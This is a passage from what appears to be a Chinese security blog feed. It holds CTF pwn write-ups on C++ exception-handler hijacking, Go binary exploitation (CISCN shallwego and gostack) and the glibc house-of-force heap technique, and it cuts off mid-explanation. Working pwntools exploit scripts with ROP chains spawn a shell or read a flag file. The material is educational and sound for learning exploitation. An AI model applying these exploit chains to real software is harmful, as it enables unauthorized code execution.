<p>将ret地址修改为backdoor函数的try块地址范围内<code>0x401252-0x401258</code>(在我的测试中发现，这个范围是个左开但是右侧不精确的范围，为了保证成功率可以使用左测边界+1的地址)。</p>
</blockquote>
<p>我们这里的try块的范围是从0x0000000000401BC2到0x0000000000401BC7的，最终能打通的范围也的确是0x0000000000401BC3到0x0000000000401BC7。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170839585.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170848861.png"
                      class=""
                >
<p>之后还需要注意的一点是，最后进入目标handler后，存在一个<code>mov qword ptr [rbp - 0x18], rax</code>的赋值，我们需要确保覆盖的rbp的值减去0x18后为一个可写的地址，否则会出错。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170859003.png"
                      class=""
                >
<p>最终exp如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">data,choice=<span class="string">&quot;n&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your chocie:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;You can record log details here:&quot;</span>,data)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Do you need to check the records?&quot;</span>,choice)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warn</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your chocie:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Type your message here plz:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your chocie:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">magic = <span class="number">0x0000000000401BC7</span></span><br><span class="line">fake_rbp = <span class="number">0x404200</span>     <span class="comment">#只要其-0x18处可写就行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    trace(<span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x70</span> + p64(fake_rbp) + p64(magic)</span><br><span class="line">warn(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">                             </span><br></pre></td></tr></table></figure></div>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>主要调用链为<code>__cxa_throw</code>-&gt;<code>_Unwind_RaiseException</code>-&gt;<code>clearup</code>-&gt;<code>_Unwind_Resume</code>-&gt;<code>对应catch块的handler函数</code></li>
<li>除了CHOP，有两处漏洞可以利用<ul>
<li>覆盖rbp进行栈迁移（有leave;ret可供使用）</li>
<li>覆盖返回地址到其他handler函数</li>
</ul>
</li>
</ul>
<h4 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h4><ul>
<li><a class="link"   href="https://blog.csdn.net/jennycisp/article/details/134965719" >https://blog.csdn.net/jennycisp/article/details/134965719<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://www.bilibili.com/video/BV1eE421L7ZE/" >https://www.bilibili.com/video/BV1eE421L7ZE/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html" >https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title>gopwn初探</title>
    <url>/blog/2024/09/22/go-pwn/</url>
    <content><![CDATA[<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
<li>Go 语言依赖垃圾回收器管理内存，而 C/C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C/C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>/<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C/C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C/C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
</ul>
<h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>
<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
                      class=""
                >
<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
<h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
                      class=""
                >
<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
                      class=""
                >
<p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
                      class=""
                >
<p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
                      class=""
                >
<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
                      class=""
                >
<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
                      class=""
                >
<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
                      class=""
                >
<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
<p>之后是正常的ROP，因为有syscall，就先把/bin/sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
                      class=""
                >
<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
                      class=""
                >
<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
                      class=""
                >
<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>
<p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>
<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
                      class=""
                >
<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx</code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
                      class=""
                >
<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
                      class=""
                >
<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
                      class=""
                >
<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把/bin/sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
                      class=""
                >
<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>go</tag>
        <tag>ciscn wp</tag>
      </tags>
  </entry>
  <entry>
    <title>house_of_force</title>
    <url>/blog/2024/10/03/house-of-force/</url>
    <content><![CDATA[<h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><p>glibc2.23 - 2.29</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>能控制top chunk的size域</li>
<li>能获取heap_base，进而计算出top_chunk的地址</li>
<li>能自由控制堆分配尺寸大小</li>
</ul>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
<li><p>将top chunk的size改得很大，使后续能够分配很大的堆块，从而使topchunk指向目标地址。</p>
</li>
<li><p>精准计算top chunk的地址与target addr-0x10之间偏移，再进行细微的调整，使申请完一个chunk后，top chunk的data域直接位于target addr处。</p>
</li>
<li><p>再申请一个chunk，往目标地址处写入值。</p>
</li>
</ul>
<h4 id="实现目的"><a href="#实现目的" class="headerlink" title="实现目的"></a>实现目的</h4><p>任意地址写</p>
<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>2.27glibc top chunk分配源代码如下</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = <span class="built_in">chunksize</span> (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">  remainder_size = size - nb;			<span class="comment">//分配后剩下的大小</span></span><br><span class="line">  remainder = <span class="built_in">chunk_at_offset</span> (victim, nb);		<span class="comment">//剩下的chunk</span></span><br><span class="line">  av-&gt;top = remainder;							<span class="comment">//更新top chunk</span></span><br><span class="line">  <span class="built_in">set_head</span> (victim, nb | PREV_INUSE |			<span class="comment">//设置从原topchunk分配出的chunk的头部</span></span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  <span class="built_in">set_head</span> (remainder, remainder_size | PREV_INUSE);	<span class="comment">//设置新的top chunk的头部</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_malloced_chunk</span> (av, victim, nb);</span><br><span class="line">  <span class="type">void</span> *p = <span class="built_in">chunk2mem</span> (victim);</span><br><span class="line">  <span class="built_in">alloc_perturb</span> (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中nb定义在<code>checked_request2size (bytes, nb);</code>,这个宏内部定义了nb的值（也就是sz）。<code>_int_malloc (mstate av, size_t bytes)</code>，bytes是该函数的参数，也就是我们调用malloc函数时传进去的数字。<code>nb</code> 实质上是用来存储经过调整后的内存请求大小的变量。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=						      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Same, except also perform an argument and result check.  First, we check</span></span><br><span class="line"><span class="comment">   that the padding done by request2size didn&#x27;t result in an integer</span></span><br><span class="line"><span class="comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span></span><br><span class="line"><span class="comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span></span><br><span class="line"><span class="comment">   overflow.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \</span></span><br><span class="line"><span class="meta">(&#123;				    \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);	    \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((sz) &lt; (req))		    \			<span class="comment">//调整后的sz一定要比传入的bytes要大</span></span></span><br><span class="line">      || <span class="built_in">REQUEST_OUT_OF_RANGE</span> (sz)) \		<span class="comment">//一般都会满足，申请的大小不要太大就行</span></span><br><span class="line">    &#123;				    \</span><br><span class="line">      __set_errno (ENOMEM);	    \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;			    \</span><br><span class="line">    &#125;				    \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
<p>这里我们如果申请一个大小为负数的chunk，实际上nb经request2size处理后是一个非常大的正数，但加上一定值后溢出，也就实现了正常的正数与负数的运算。我们的topchunk实际上会向低地址处偏移。需要注意的是，申请一个大小为负数的chunk时，这个负数会被unsigned int转换成一个非常大的数。这时如果我们这个转换后的数的大小大于我们修改的top chunk的size，<code>malloc</code> 将尝试扩展堆空间，这时候就会调用 <code>sysmalloc</code>，其中就会报错退出。所我们一般直接把top chunk的size改成-1，也就是0xffffffffffffffff。基本就可以通过所有检测。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002907725.png"
                      class=""
                >
<p>由于我们要精准控制申请后的大小来使top chunk落在想要的位置，也就是要控制request2size(req)的值</p>
